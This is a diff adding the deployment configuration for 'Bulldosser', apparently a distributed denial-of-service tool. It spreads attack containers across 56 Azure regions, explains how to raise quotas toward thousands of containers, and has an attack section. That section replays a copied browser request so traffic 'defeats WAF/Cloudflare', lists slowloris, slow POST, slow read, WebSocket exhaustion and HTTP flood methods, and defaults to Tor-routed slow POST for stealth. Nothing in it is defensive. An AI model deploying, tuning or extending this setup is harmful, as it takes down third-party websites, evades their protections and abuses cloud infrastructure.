@@ -1,0 +1,167 @@
+# Bulldosser — Deployment Configuration
+# Copy this file to config.local.yaml and fill in your values.
+# config.local.yaml is gitignored by default.
+
+azure:
+  subscription_id: "00000000-0000-0000-0000-000000000000"
+  acr_name: "myprojectacr"
+  resource_group: "bulldosser-rg"
+
+container:
+  image_tag: "latest"
+  cpu: 1
+  memory_gb: 1.5
+  restart_policy: "Always"
+  workers_per_vcpu: 250
+
+# 56 verified deployable regions (default Azure account, Oct 2026).
+# Default ACI quota: 10 StandardCores per region = 560 max containers at 1 vCPU.
+# Set containers to 0 to skip a region. The scale command auto-activates
+# dormant regions when scaling beyond current active capacity.
+#
+# Only westeurope is blocked (not accepting new ACI customers).
+#
+# Quota increase: request via Azure Portal → Support + Service Limits →
+#   Microsoft.ContainerInstance → StandardCores. Typical approvals:
+#   - 10 → 50 cores: auto-approved in minutes for most regions
+#   - 10 → 100 cores: usually approved within 24h
+#   - 10 → 200+ cores: may require business justification, 1-3 business days
+#   With 100 cores/region across 56 regions = 5,600 containers max.
+regions:
+  # North America (10 regions)
+  - name: eastus
+    containers: 10
+  - name: eastus2
+    containers: 10
+  - name: centralus
+    containers: 10
+  - name: westus
+    containers: 10
+  - name: westus2
+    containers: 10
+  - name: westus3
+    containers: 10
+  - name: northcentralus
+    containers: 0
+  - name: southcentralus
+    containers: 0
+  - name: westcentralus
+    containers: 0
+  - name: canadacentral
+    containers: 0
+  - name: canadaeast
+    containers: 0
+  - name: mexicocentral
+    containers: 0
+  # South America (3 regions)
+  - name: brazilsouth
+    containers: 0
+  - name: brazilsoutheast
+    containers: 0
+  - name: chilecentral
+    containers: 0
+  # Europe (16 regions)
+  - name: northeurope
+    containers: 0
+  - name: uksouth
+    containers: 0
+  - name: ukwest
+    containers: 0
+  - name: francecentral
+    containers: 0
+  - name: francesouth
+    containers: 0
+  - name: germanywestcentral
+    containers: 0
+  - name: germanynorth
+    containers: 0
+  - name: swedencentral
+    containers: 0
+  - name: norwayeast
+    containers: 0
+  - name: norwaywest
+    containers: 0
+  - name: switzerlandnorth
+    containers: 0
+  - name: switzerlandwest
+    containers: 0
+  - name: polandcentral
+    containers: 0
+  - name: italynorth
+    containers: 0
+  - name: spaincentral
+    containers: 0
+  - name: austriaeast
+    containers: 0
+  - name: belgiumcentral
+    containers: 0
+  - name: denmarkeast
+    containers: 0
+  # Middle East & Africa (6 regions)
+  - name: uaecentral
+    containers: 0
+  - name: uaenorth
+    containers: 0
+  - name: qatarcentral
+    containers: 0
+  - name: israelcentral
+    containers: 0
+  - name: southafricanorth
+    containers: 0
+  - name: southafricawest
+    containers: 0
+  # Asia-Pacific (13 regions)
+  - name: australiaeast
+    containers: 0
+  - name: australiasoutheast
+    containers: 0
+  - name: australiacentral
+    containers: 0
+  - name: australiacentral2
+    containers: 0
+  - name: japaneast
+    containers: 0
+  - name: japanwest
+    containers: 0
+  - name: koreacentral
+    containers: 0
+  - name: koreasouth
+    containers: 0
+  - name: southeastasia
+    containers: 0
+  - name: eastasia
+    containers: 0
+  - name: centralindia
+    containers: 0
+  - name: southindia
+    containers: 0
+  - name: westindia
+    containers: 0
+  - name: indiasouthcentral
+    containers: 0
+  - name: indonesiacentral
+    containers: 0
+  - name: malaysiawest
+    containers: 0
+  - name: newzealandnorth
+    containers: 0
+
+attack:
+  # Paste a curl command (Copy as cURL from browser DevTools) into the curl_file.
+  # All headers, cookies, and request data are passed to every container so
+  # traffic is indistinguishable from a real browser session (defeats WAF/Cloudflare).
+  curl_file: "requests/target_request.txt"
+
+  # Attack methods (recommended first):
+  #   slowpost_tor  — async slow POST via Tor, highest stealth + IP diversity
+  #   slowloris_tor — Tor-routed partial headers, effective against Apache
+  #   slowpost      — async slow POST (direct, no Tor)
+  #   slowloris     — partial header flood (direct)
+  #   slowread      — slow response drain, ties up server workers
+  #   ws_exhaust    — WebSocket connection exhaustion
+  #   http_flood    — full request replay at high volume
+  method: "slowpost_tor"
+  connections: 500
+  requests_per_cycle: 10000
+  parallel_workers: 200
+  sleep_interval: 5
